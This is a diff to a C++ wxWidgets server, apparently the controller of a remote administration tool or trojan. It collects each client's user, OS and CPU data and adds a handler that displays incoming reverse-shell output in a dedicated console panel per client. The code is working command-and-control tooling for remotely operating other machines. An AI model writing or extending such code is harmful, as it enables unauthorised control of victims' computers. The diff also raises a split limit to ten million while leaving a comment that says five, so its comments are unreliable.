@@ -226,14 +226,14 @@ void Servidor::m_Escucha(){
     //Crear descriptor and setearlo a zero
     struct timeval timeout;
     timeout.tv_sec = 0;
-    timeout.tv_usec = 0;
+    timeout.tv_usec = 600000;
     fd_set fdMaster;
     FD_ZERO(&fdMaster);
     
     FD_SET(this->sckSocket, &fdMaster);
     
     while(this->p_Escuchando){
-        Sleep(100); //uso de CPU
+        //Sleep(10); //uso de CPU
 
         fd_set fdMaster_copy = fdMaster;
         
@@ -298,13 +298,13 @@ void Servidor::m_Escucha(){
                     continue;
                 }
 
-                std::cout << cBuffer << "\n";
+                std::cout <<"BUFFER: "<< cBuffer << "\n";
                 
                 if (iRecibido <= 0) {
                     closesocket(iSock);
                     FD_CLR(iSock, &fdMaster);
                 } else {
-                    std::vector<std::string> vcDatos = strSplit(std::string(cBuffer), '\\', 5); //maximo 5 por ahora, pero se deberia de incrementar en un futuro
+                    std::vector<std::string> vcDatos = strSplit(std::string(cBuffer), '\\', 10000000); //maximo 5 por ahora, pero se deberia de incrementar en un futuro
 
                     if(vcDatos[0] == "01") { //Paquete inicial user,so,cpu
                         struct Cliente structTmp;
@@ -361,6 +361,37 @@ void Servidor::m_Escucha(){
                                 }
                             }
                         } else {
+                            std::cout << "No se pudo encontrar ventana activa con nombre " << strTempID << std::endl;
+                        }
+
+                    }
+
+                    if (vcDatos[0] == "06") {
+                        std::string strOutJoined = "";
+                        for (int i = 1; i<int(vcDatos.size()); i++) {
+                            strOutJoined += vcDatos[i] + "\\";
+                        }
+
+                        std::string strTempID = "";
+                        std::unique_lock<std::mutex> lock(vector_mutex);
+                        for (auto vcCli : this->vc_Clientes) {
+                            if (vcCli._sckCliente == iSock) {
+                                strTempID = vcCli._id;
+                                break;
+                            }
+                        }
+                        lock.unlock();
+
+                        FrameCliente* temp = (FrameCliente*)wxWindow::FindWindowByName(strTempID);
+                        if (temp) {
+                            panelReverseShell* panel_shell = (panelReverseShell*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Reverse_Shell, temp);
+                            if (panel_shell) {
+                                panel_shell->txtConsole->AppendText(strOutJoined);
+                                panel_shell->p_uliUltimo = panel_shell->txtConsole->GetLastPosition();
+
+                            }
+                        }
+                        else {
                             std::cout << "No se pudo encontrar ventana activa con nombre " << strTempID << std::endl;
                         }
 
